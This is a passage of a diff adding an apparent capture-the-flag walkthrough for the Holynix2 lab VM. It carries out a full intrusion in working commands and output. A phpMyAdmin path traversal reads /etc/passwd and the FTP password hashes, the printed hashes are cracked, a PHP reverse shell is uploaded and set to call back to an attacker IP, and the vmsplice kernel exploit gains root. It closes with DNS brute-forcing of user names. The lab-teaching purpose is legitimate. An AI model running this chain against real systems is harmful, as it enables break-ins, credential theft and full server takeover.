+  |   proxy:x:13:13:proxy:/bin:/bin/sh
+  |   www-data:x:33:33:www-data:/var/www:/bin/sh
+  |   backup:x:34:34:backup:/var/backups:/bin/sh
+  |   list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+  |   irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+  |   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+  |   nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+  |   libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+  |   dhcp:x:101:102::/nonexistent:/bin/false
+  |   syslog:x:102:103::/home/syslog:/bin/false
+  |   klog:x:103:104::/home/klog:/bin/false
+  |   bind:x:104:111::/var/cache/bind:/bin/false
+  |   sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+  |   mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+  |   lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
+  |   cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
+  |   ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
+  |   skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
+  |   amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
+  |   cmahong:x:1005:2002::/home/cmahong:/bin/false
+  |   lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
+  |   jstreet:x:1007:2002::/home/jstreet:/bin/false
+  |   rwoo:x:1008:2002::/home/rwoo:/bin/false
+  |   kmccallum:x:1009:2002::/home/kmccallum:/bin/false
+  |   cjalong:x:1010:2002::/home/cjalong:/bin/false
+  |   jsmith:x:1011:2002::/home/jsmith:/bin/false
+  |   dhammond:x:1012:2002::/home/dhammond:/bin/false
+  |   hmcknight:x:1013:2002::/home/hmcknight:/bin/false
+  |   lwestre:x:1014:2002::/home/lwestre:/bin/false
+  |   gwelch:x:1015:2002::/home/gwelch:/bin/false
+  |   dmoran:x:1016:2002::/home/dmoran:/bin/false
+  |   dsummers:x:1017:2002::/home/dsummers:/bin/false
+  |   bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
+  |   ncobol:x:1019:2002::/home/ncobol:/bin/false
+  |   ddypsky:x:1020:2002::/home/ddypsky:/bin/false
+  |   rcropper:x:1021:2002::/home/rcropper:/bin/false
+  |   cbergey:x:1022:2002::/home/cbergey:/bin/false
+  |   tmartin:x:1023:2002::/home/tmartin:/bin/false
+  |   jgacy:x:1024:2002::/home/jgacy:/bin/false
+  |   splath:x:1025:2002::/home/splath:/bin/false
+  |   evorhees:x:1026:2002::/home/evorhees:/bin/false
+  |   rfrost:x:1027:2002::/home/rfrost:/bin/false
+  |   ahuxley:x:1028:2002::/home/ahuxley:/bin/false
+  |   webmaster:x:1029:2002::/var/www:/bin/false
+  |   cmanson:x:1030:2002::/home/cmanson:/bin/false
+  |   vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false
+  |   ../../../../../etc/passwd saved to passwd.txt
+  |   
+  |     References:
+  |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
+  |_      http://www.exploit-db.com/exploits/1244/
+
+  Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
+
+The :program:`curl` equivalent is simply:
+
+.. code-block:: bash
+
+  curl http://$T/phpMyAdmin/libraries/grab_globals.lib.php? \
+    --data usesubform[1]=1 \
+    --data subform[1][redirect]="../../../../../etc/passwd"
+
+phpMyAdmin lets you download vulnerable files without a CVE
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+You don't need a vulnerability to get an arbitrary file from phpMyAdmin. Just open up http://www.zincftp.com/phpMyAdmin/db_details_structure.php?db=zincftp%3Fdata and create a new table named passwords with 1 field. On the resulting web page, name the field "password" of length (say) 100 and select "Save". In the resulting web page change the query to "load data local infile '/etc/passwd' into table passwords;" then select "Go". (For MySQL syntax details see `13.2.6 LOAD DATA INFILE Syntax <https://dev.mysql.com/doc/refman/5.0/en/load-data.html>`_.) To download the file select Export at the top, then in the resulting web page select "CSV", "Save as file", then select "Go".
+
+For utter simplicity we'll use the ``curl`` vulnerability exploitation command above, knowing that there is an equivalent that can be used when the vulnerability is not available.
+
+Comparing the FTP users to /etc/passwd users
+--------------------------------------------
+
+Only 5 FTP users can SSH
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Let's see which of the FTP users actually can log on via SSH:
+
+.. code-block:: bash
+
+  cd $PT/passwords
+  grep '/bin/bash' passwd.txt | grep -v '^root' | cut -d: -f1
+
+Running this shows the 5 FTP users that are also SSH users:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/users$ cd $PT/passwords
+  hacker@kali:~/pentest/holynix2/users$ grep '/bin/bash' passwd.txt | grep -v '^root' | cut -d: -f1
+  lsanderson
+  cfinnerly
+  ddonnovan
+  skrymple
+  amckinley
+
+Get PureFTP password hashes via phpMyAdmin
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+`PureFTP <https://help.ubuntu.com/community/PureFTP>`_ shows the default location for Ubuntu's pure-ftpd package password file is :file:`/etc/pure-ftpd/pureftpd.passwd`. We know we can get the hashes via:
+
+.. code-block:: bash
+
+  cd $PT/passwords
+  curl --silent --output pureftpd.passwd \
+    http://$T/phpMyAdmin/libraries/grab_globals.lib.php? \
+    --data usesubform[1]=1 \
+    --data subform[1][redirect]="../../../../../etc/pure-ftpd/pureftpd.passwd"
+  cat pureftpd.passwd
+
+Running this gives:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/passwords$ cd $PT/passwords
+  hacker@kali:~/pentest/holynix2/passwords$ curl --silent --output pureftpd.passwd \
+  >   http://$T/phpMyAdmin/libraries/grab_globals.lib.php? \
+  >   --data usesubform[1]=1 \
+  >   --data subform[1][redirect]="../../../../../etc/pure-ftpd/pureftpd.passwd"
+  hacker@kali:~/pentest/holynix2/passwords$ cat pureftpd.passwd
+  cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
+  lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
+  jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
+  rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
+  cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
+  kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
+  cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
+  jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
+  lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
+  dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
+  hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
+  lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
+  gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
+  dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
+  dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
+  bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
+  amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
+  ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
+  ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
+  rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
+  ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
+  cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
+  tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
+  jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
+  splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
+  skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
+  evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
+  rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
+  ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
+  cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
+  webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::
+
+Note that even if we crack these passwords, they only give us FTP access, not SSH access. But FTP access allows uploading a reverse php shell to get shell access.
+
+
+The Exploit
+===========
+
+We're ready to start our exploit. When we're done we'll have to remember to switch DNS resolution back, then undo the impersonation:
+
+.. code-block:: bash
+
+  # undo the the networking changes
+  $SUDO ip route del $T/32
+  ip route show
+  $SUDO ip addr del $TRUSTED dev $IF
+  ip addr show $IF
+
+But don't do that just yet.
+
+The plan
+--------
+
+Our goal is root and there are 2 basic possibilities: via SSH or FTP.
+
+* SSH
+
+  SSH seems like the more direct route but requires online password cracking, which is notoriously slow and relies on weak passwords. Of the 30 userid's harvested from DNS, only 5 have shell access and their passwords are safely tucked away in :file:`/etc/shadow`. We could attempt to crack their FTP hashes with hopes that their SSH passwords are the same. Unfortunately, a 4 hour offline run only succeeded in cracking 3 of the 30 FTP hashes and none of those were for users who had shell access.
+
+* FTP
+
+  The idea here is to FTP up a reverse shell to get basic shell access, then run an exploit to get root. Before we can use FTP a valid userid/password is required. We already have the FTP password hashes for password cracking; only 1 weak password out of 30 is needed to exploit a reverse PHP shell.
+
+Cracking the FTP password hashes
+--------------------------------
+
+We could use :program:`john` or :program:`hashcat` to crack the passwords. We'll use :file:`/usr/share/wordlists/rockyou. :program:`john` works directly with :file:`pureftpd.passwd` while :program:`hashcat` requires identifying the hash type (500) with the input file having the hash field only.
+
+.. code-block:: bash
+
+  cd $PT/passwords
+  zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
+  # running john is as simple as
+  # /usr/sbin/john --wordlist=rockyou.txt pureftpd.passwd | tee cracked-john.txt
+  # hashcat requires more work and (for the first run) saying YES to a license
+  cut -d: -f2 pureftpd.passwd > hashes.txt
+  MODE=$(head -n 1 hashes.txt | python2 $(which hashid) -m | \
+      grep 'Hashcat Mode:' | head -n 1 | sed 's/^.*Hashcat Mode: //;s/]$//')
+  hashcat --hash-type=$MODE hashes.txt rockyou.txt  | tee cracked.txt
+
+This quickly got the following password hash cracked. (Enter :kbd:`Control-c` after first password hash is cracked.):
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/passwords$ cd $PT/passwords
+  hacker@kali:~/pentest/holynix2/passwords$ zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
+  hacker@kali:~/pentest/holynix2/passwords$ # running john is as simple as
+  hacker@kali:~/pentest/holynix2/passwords$ # /usr/sbin/john --wordlist=rockyou.txt pureftpd.passwd
+  hacker@kali:~/pentest/holynix2/passwords$ # hashcat requires more work
+  hacker@kali:~/pentest/holynix2/passwords$ cut -d: -f2 pureftpd.passwd > hashes.txt
+  hacker@kali:~/pentest/holynix2/passwords$ MODE=$(head -n 1 hashes.txt | python2 $(which hashid) -m | \
+  >     grep 'Hashcat Mode:' | head -n 1 | sed 's/^.*Hashcat Mode: //;s/]$//')
+  hacker@kali:~/pentest/holynix2/passwords$ hashcat --hash-type=$MODE hashes.txt rockyou.txt  | tee cracked.txt
+  Initializing hashcat v0.49 with 2 threads and 32mb segment-size...
+
+  Added hashes from file hashes.txt: 31 (31 salts)
+
+  NOTE: press enter for status-screen
+
+  $1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:millionaire
+  ^CTo restore Session use Parameter -s 64616
+
+So user tmartin has the password "millionaire":
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/passwords$ grep '$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.' pureftpd.passwd | cut -d: -f1
+  tmartin
+
+Uploading and executing the php reverse shell
+---------------------------------------------
+
+Let's upload the php reverse shell:
+
+.. code-block:: bash
+
+  ATTACKER=192.168.1.106
+  PORT=9999
+  cd $PT/exploit
+  FTPUSER=tmartin
+  PASSWORD=millionaire
+  # Upload a php reverse shell
+  RSHELL=$(locate php | grep reverse | tail --lines=1)
+  UPLOAD=rshell.php
+  cp $RSHELL $UPLOAD
+  # Modify reverse shell to connect to ATTACKER
+  sed -i "s/\$ip = '127.0.0.1'/\$ip = '$ATTACKER'/" $UPLOAD
+  sed -i "s/\$port = 1234/\$port = $PORT/" $UPLOAD
+  curl --silent --upload-file $UPLOAD \
+       --user $FTPUSER:$PASSWORD  ftp://$T/web/
+  # The uploaded shell is at http://$FTPUSER.zincftp.com/~tmartin/rshell.php
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/exploit$ ATTACKER=192.168.1.106
+  hacker@kali:~/pentest/holynix2/exploit$ PORT=9999
+  hacker@kali:~/pentest/holynix2/passwords$ cd $PT/exploit
+  hacker@kali:~/pentest/holynix2/exploit$ FTPUSER=tmartin
+  hacker@kali:~/pentest/holynix2/exploit$ PASSWORD=millionaire
+  hacker@kali:~/pentest/holynix2/exploit$ # Upload a php reverse shell
+  hacker@kali:~/pentest/holynix2/exploit$ RSHELL=$(locate php | grep reverse | tail --lines=1)
+  hacker@kali:~/pentest/holynix2/exploit$ UPLOAD=rshell.php
+  hacker@kali:~/pentest/holynix2/exploit$ cp $RSHELL $UPLOAD
+  hacker@kali:~/pentest/holynix2/exploit$ # Modify reverse shell to connect to ATTACKER
+  hacker@kali:~/pentest/holynix2/exploit$ sed -i "s/\$ip = '127.0.0.1'/\$ip = '$ATTACKER'/" $UPLOAD
+  hacker@kali:~/pentest/holynix2/exploit$ sed -i "s/\$port = 1234/\$port = $PORT/" $UPLOAD
+  hacker@kali:~/pentest/holynix2/exploit$ curl --silent --upload-file $UPLOAD \
+  >      --user $FTPUSER:$PASSWORD  ftp://$T/web/
+  hacker@kali:~/pentest/holynix2/exploit$ # The uploaded shell is at http://$FTPUSER.zincftp.com/~tmartin/rshell.php
+
+Now open up a listener in a separate window:
+
+.. code-block:: bash
+
+  PORT=9999
+  socat - tcp-listen:$PORT
+
+Then fire off the reverse shell. Note that this requires you to use the DNS server $T. More recent versions of :program:`curl` have a "--dns-servers" option, but Kali has an old version lacking this.
+
+.. code-block:: bash
+
+  # Remember to update DNS to use nameserver $T
+  # Or edit /etc/hosts to add '192.168.1.88 tmartin.zincftp.com'
+  curl --silent http://$FTPUSER.zincftp.com/rshell.php
+
+If DNS is set up properly you should see a shell open up in to "socat" listener window:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/exploit$ socat - tcp-listen:9999
+  Linux holynix2 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
+   22:31:28 up  4:13,  1 user,  load average: 0.00, 0.00, 0.00
+  USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+  root     tty1     -                18:36    6:22m  0.22s  0.14s -bash
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  /bin/sh: can't access tty; job control turned off
+
+As soon as you see the shell open up on the "socat" window you can :kbd:`Control-c` the ``curl`` command:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/exploit$ curl --silent http://$FTPUSER.zincftp.com/rshell.php
+  ^C
+
+
+Getting to root
+---------------
+
+A search for "ubuntu 8.04 kernel 2.6.22 exploit" hit `Local root exploit in kernel 2.6.17 - 2.6.24 (vmsplice) <https://bugs.launchpad.net/ubuntu/+source/linux-source-2.6.22/+bug/190587>`_. The source code for vmsplice can be viewed online at `Linux Kernel 2.6.23 <= 2.6.24 - vmsplice Local Root Exploit <https://www.exploit-db.com/exploits/5093/>`_ and other root exploits can be found at `Hackers Hut 12. Local root exploits <http://www.win.tue.nl/~aeb/linux/hh/hh-12.html>`_. Download the following in the source file :download:`holynix2-exploit.c <holynix2-exploit.c>` to the $PT/exploit directory.
+
+Upload the file via FTP
+
+.. code-block:: bash
+
+  cd $PT/exploit
+  FTPUSER=tmartin
+  PASSWORD=millionaire
+  # Upload holynix2-exploit.c
+  UPLOAD=holynix2-exploit.c
+  curl --silent --upload-file $UPLOAD \
+       --user $FTPUSER:$PASSWORD  ftp://$T/web/
+     
+Then in the socat listener window continue on in the reverse shell:
+
+.. code-block:: bash
+
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  cp ~tmartin/web/holynix2-exploit.c /tmp/
+  cd /tmp
+  gcc holynix2-exploit.c -o exploit
+  ./exploit
+  id
+  su - root
+  id
+
+Running this gives:
+
+.. code-block:: console 
+
+  $ python -c 'import pty; pty.spawn("/bin/bash")'
+  www-data@holynix2:/$ cp ~tmartin/web/holynix2-exploit.c /tmp/
+  cp ~tmartin/web/holynix2-exploit.c /tmp/
+  cd /tmp
+  gcc holynix2-exploit.c -o exploit
+  ./exploit
+  www-data@holynix2:/$ cd /tmp
+  cd /tmp
+  www-data@holynix2:/tmp$ gcc holynix2-exploit.c -o exploit
+  gcc holynix2-exploit.c -o exploit
+  www-data@holynix2:/tmp$ ./exploit
+  ./exploit
+  -----------------------------------
+   Linux vmsplice Local Root Exploit
+   By qaaz
+  -----------------------------------
+  [+] mmap: 0x0 .. 0x1000
+  [+] page: 0x0
+  [+] page: 0x20
+  [+] mmap: 0x4000 .. 0x5000
+  [+] page: 0x4000
+  [+] page: 0x4020
+  [+] mmap: 0x1000 .. 0x2000
+  [+] page: 0x1000
+  [+] mmap: 0xb7db9000 .. 0xb7deb000
+  [+] root
+  root@holynix2:/tmp# id
+  id
+  uid=0(root) gid=0(root) groups=33(www-data)
+  root@holynix2:/tmp# su - root
+  su - root
+  root@holynix2:~# id
+  id
+  uid=0(root) gid=0(root) groups=0(root)
+
+And we are root.
+
+Cleaning up
+-----------
+
+Unless you're planning on doing the following pentest calisthenics, it's time to clean up the network setup. First, change DNS resolution back to normal (probably editing :file:`/etc/resolv.conf`). Then remove any extra ip addresses and routing:
+
+.. code-block:: bash
+
+  IF=eth0
+  T=192.168.1.88
+  TRUSTED=192.168.1.34
+  # undo the the networking changes
+  $SUDO ip route del $T/32
+  ip route show
+  $SUDO ip addr del $TRUSTED dev $IF
+  ip addr show $IF
+
+And if you're done with holynix2 you can shut down the host from your remote shell terminal.
+
+Pentest Calisthenics - Getting the User List
+============================================
+
+User list from the DNS axfr
+---------------------------
+
+This is not needed for this exploit, but illustrates both a dead end the author took and some useful techniques.
+
+First a little script-fu gets us our FTP users list from the DNS axfr file:
+
+.. code-block:: bash
+
+  cd $PT/passwords
+  cut -d$'\t' -f1 ../dns/dns_axfr.txt | \
+    sed 's/\.zincftp\.com\..*//' | \
+    egrep -v '(^;|^dev$|^mta$|^ns1$|^ns2$|^trusted$|^www$|^zincftp\.com\.$|^$)' \
+    > users.txt
+
+From this we harvest these userids:
+
++-----------------+
+| userid          |
++=================+
+| ahuxley         |
++-----------------+
+| amckinley       |
++-----------------+
+| bzimmerman      |
++-----------------+
+| cbergey         |
++-----------------+
+| cfinnerly       |
++-----------------+
+| cjalong         |
++-----------------+
+| cmahong         |
++-----------------+
+| cmanson         |
++-----------------+
+| ddonnovan       |
++-----------------+
+| ddypsky         |
++-----------------+
+| dhammond        |
++-----------------+
+| dmoran          |
++-----------------+
+| dsummers        |
++-----------------+
+| evorhees        |
++-----------------+
+| gwelch          |
++-----------------+
+| hmcknight       |
++-----------------+
+| jgacy           |
++-----------------+
+| jsmith          |
++-----------------+
+| jstreet         |
++-----------------+
+| kmccallum       |
++-----------------+
+| lnickerbacher   |
++-----------------+
+| lsanderson      |
++-----------------+
+| lwestre         |
++-----------------+
+| ncobol          |
++-----------------+
+| rcropper        |
++-----------------+
+| rfrost          |
++-----------------+
+| rwoo            |
++-----------------+
+| skrymple        |
++-----------------+
+| splath          |
++-----------------+
+| tmartin         |
++-----------------+
+
+Could we brute-force the user ids?
+----------------------------------
+
+Suppose our DNS axfr failed. Could a significant part of the user list be brute-forced? Let's assume we guessed the user ids were first initial, last name and used the `First initial last names - w/ count <http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2>`_ file from `Passwords <https://wiki.skullsecurity.org/Passwords>`_. How many would we have gotten after a reasonable number of DNS queries?
+
+.. code-block:: bash
+
+  curl --silent --remote-name http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2
+  tar -xvjf facebook-f.last-withcount.txt.bz2
+  NAMES="ahuxley amckinley bzimmerman cbergey cfinnerly"
+  NAMES=" $NAMES cjalong cmahong cmanson ddonnovan ddypsky"
+  NAMES=" $NAMES dhammond dmoran dsummers evorhees gwelch"
+  NAMES=" $NAMES hmcknight jgacy jsmith jstreet kmccallum"
+  NAMES=" $NAMES lnickerbacher lsanderson lwestre ncobol rcropper"
+  NAMES=" $NAMES rfrost rwoo skrymple splath tmartin"
+  for n in $NAMES; do
+    # name check output format is:
+    #   LINE_FOUND:   NUM_NAMES NAME
+    echo checking $n
+    grep -n -m 1 "$n" facebook-f.last-withcount.txt
+  done
+
+When running the check we saw:
+
+.. code-block:: console
+
+  checking ahuxley
+  158988:     97 ahuxley
+  checking amckinley
+  27746:    535 amckinley
+  checking bzimmerman
+  10770:   1223 bzimmerman
+  checking cbergey
+  384763:     38 cbergey
+  checking cfinnerly
+  checking cjalong
+  3074431:      4 cjalong
+  checking cmahong
+  6256367:      2 cmahong
+  checking cmanson
+  30574:    490 cmanson
+  checking ddonnovan
+  3045816:      4 ddonnovan
+  checking ddypsky
+  checking dhammond
+  6589:   1833 dhammond
+  checking dmoran
+  11439:   1163 dmoran
+  checking dsummers
+  7808:   1602 dsummers
+  checking evorhees
+  3948134:      3 evorhees
+  checking gwelch
+  20300:    707 gwelch
+  checking hmcknight
+  99115:    157 hmcknight
+  checking jgacy
+  1174299:     11 jgacy
+  checking jsmith
+  1: 129369 jsmith
+  checking jstreet
+  12828:   1056 jstreet
+  checking kmccallum
+  32894:    458 kmccallum
+  checking lnickerbacher
+  checking lsanderson
+  21333:    676 lsanderson
+  checking lwestre
+  2316133:      5 lwestre
+  checking ncobol
+  10621681:      1 ncobol
+  checking rcropper
+  179193:     85 rcropper
+  checking rfrost
+  11311:   1173 rfrost
+  checking rwoo
+  1410:   5722 rwood
+  checking skrymple
+  checking splath
+  178955:     85 splath
+  checking tmartin
+  330:  14139 tmartin
+
+So out of the 30 user ids, 4 were not in the Facebook list. But to get those we would have had to check 6,256,367 names. If we only checked the top 1,000 names (15 seconds) we would have found only 2 names; 10,000 names (2.5 minutes) would yield 5; 100,000 (25 minutes, presumably) would yield 15 (half) and would pick up the userid tmartin (whose password was first hacked). If looking for some id's to try, that would be enough to start. Here the script to time 100,000 checks:
+
+.. code-block:: bash
+
+  D=$(date)
+  N=0
+  NCHECK=100000
+  while read LINE; do
+    ((N=N+1))
+    [[ $N -gt $NCHECK ]] && break
+    LINE=${LINE##* }
+    dig A @192.168.1.88 $LINE.zincftp.com > /dev/null
+  done < facebook-f.last-withcount.txt
+  echo $D
+  date
+
+What's on the user's FTP web page?
+----------------------------------
+
+Finding exploitable content on the user's home page appears to have been a dead end. But to illustrate how you'd automate that we include it in the writeup.
+
+Change your DNS resolution to use $T since fetching the user's home page requires using the FQDN. For Kali that implies changing your :file:`/etc/resolv.conf` to have "nameserver" point to $T.
+
+Let's pick out the links on the user home pages using `Beautiful Soup`_. That requires the following python file named ``getlinks.py`` in the directory $PT/files and making it executable:
+
+.. code-block:: python
+
+  #!/usr/bin/env python
+  import argparse
+  import urlparse
+  import urllib2
+  from bs4 import BeautifulSoup
+
+  if __name__ == "__main__":
+      parser = argparse.ArgumentParser(description="Scrape page for hrefs")
+      parser.add_argument("url", help="url to fetch hrefs")
+      args = parser.parse_args()
+      try:
+        req = urllib2.urlopen(args.url)
+        url_r = req.geturl()
+        status = req.getcode()
+        page = req.read()
+        soup = BeautifulSoup(page)
+        soup.prettify()
+        for anchor in soup.findAll('a', href=True):
+            print urlparse.urljoin(url_r, anchor['href'])
+      except urllib2.URLError as e:
+        print e.reason
+      except urllib2.HTTPError as e:
+        print e.reason
+
+Using the python program, download the files for inspection:
+
+.. code-block:: bash
+
+  cd $PT/files
+  mkdir -p downloads
+  sed 's/^/http:\/\//;s/$/.zincftp.com\//' $PT/passwords/users.txt > urls.txt
+  cat urls.txt | xargs -n 1 ./getlinks.py | \
+    egrep -v '\?C=N;O=D|\?C=M;O=A|\?C=S;O=A|\?C=D;O=A' \
+    > home_links.txt
+  cat home_links.txt
+  cd downloads
+  cat ../home_links.txt | xargs -n 1 curl --silent --remote-name
+  cd ..
+  ls -la downloads/
+  file -k downloads/*
+  
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 8-27
+
+  hacker@kali:~/pentest/holynix2/passwords$ cd $PT/files
+  hacker@kali:~/pentest/holynix2/files$ mkdir -p downloads
+  hacker@kali:~/pentest/holynix2/files$ sed 's/^/http:\/\//;s/$/.zincftp.com\//' $PT/users/users.txt > urls.txt
+  hacker@kali:~/pentest/holynix2/files$ cat urls.txt | xargs -n 1 ./getlinks.py | \
+  >   egrep -v '\?C=N;O=D|\?C=M;O=A|\?C=S;O=A|\?C=D;O=A' \
+  >   > home_links.txt
+  hacker@kali:~/pentest/holynix2/files$ cat home_links.txt
+  http://cjalong.zincftp.com/103670-pink_floyd_617_409.jpg
+  http://cjalong.zincftp.com/pinkdance.jpg
+  http://ddonnovan.zincftp.com/resume.txt
+  http://dmoran.zincftp.com/New%20Image1.jpg
+  http://dmoran.zincftp.com/girlscouts.jpg
+  http://dmoran.zincftp.com/mac-users.jpg
+  http://dmoran.zincftp.com/prime.jpg
+  http://dmoran.zincftp.com/simplicity.jpg
+  http://hmcknight.zincftp.com/family-photo-2005-10.jpg
+  http://jstreet.zincftp.com/manson.mp3
+  http://jstreet.zincftp.com/wrar393.exe
+  http://lwestre.zincftp.com/lighttpd-1.4.17.tar.gz
+  http://lwestre.zincftp.com/peercast.1212.tgz
+  http://lwestre.zincftp.com/wu-ftpd-2.6.0.tar.gz
+  http://ncobol.zincftp.com/Hitler%20sings.wmv
+  http://rcropper.zincftp.com/3some.jpg
+  http://rcropper.zincftp.com/invisibleman.jpg
+  http://rcropper.zincftp.com/mans%20dream%20remote.jpg
+  http://rcropper.zincftp.com/phase10_win32_0.1.zip
+  http://rfrost.zincftp.com/Shopping%20List.txt
+  hacker@kali:~/pentest/holynix2/files$ cd downloads
+  hacker@kali:~/pentest/holynix2/files/downloads$ cat ../home_links.txt | xargs -n 1 curl --silent --remote-name
+  hacker@kali:~/pentest/holynix2/files/downloads$ cd ..
+  hacker@kali:~/pentest/holynix2/files$ ls -la downloads/
+  total 13368
+  drwxr-xr-x 2 hacker hacker    4096 Jun  7 10:23 .
+  drwxr-xr-x 4 hacker hacker    4096 Jun  7 10:21 ..
+  -rw-r--r-- 1 hacker hacker   73728 Jun  7 10:23 103670-pink_floyd_617_409.jpg
+  -rw-r--r-- 1 hacker hacker   33178 Jun  7 10:23 3some.jpg
+  -rw-r--r-- 1 hacker hacker  664848 Jun  7 10:23 family-photo-2005-10.jpg
+  -rw-r--r-- 1 hacker hacker   57036 Jun  7 10:23 girlscouts.jpg
+  -rw-r--r-- 1 hacker hacker 4071333 Jun  7 10:23 Hitler%20sings.wmv
+  -rw-r--r-- 1 hacker hacker    7967 Jun  7 10:23 invisibleman.jpg
+  -rw-r--r-- 1 hacker hacker  801282 Jun  7 10:23 lighttpd-1.4.17.tar.gz
+  -rw-r--r-- 1 hacker hacker   72859 Jun  7 10:23 mac-users.jpg
+  -rw-r--r-- 1 hacker hacker   19248 Jun  7 10:23 mans%20dream%20remote.jpg
+  -rw-r--r-- 1 hacker hacker 4840032 Jun  7 10:23 manson.mp3
+  -rw-r--r-- 1 hacker hacker   94589 Jun  7 10:23 New%20Image1.jpg
+  -rw-r--r-- 1 hacker hacker  197079 Jun  7 10:23 peercast.1212.tgz
+  -rw-r--r-- 1 hacker hacker  837160 Jun  7 10:23 phase10_win32_0.1.zip
+  -rw-r--r-- 1 hacker hacker   32484 Jun  7 10:23 pinkdance.jpg
+  -rw-r--r-- 1 hacker hacker   95037 Jun  7 10:23 prime.jpg
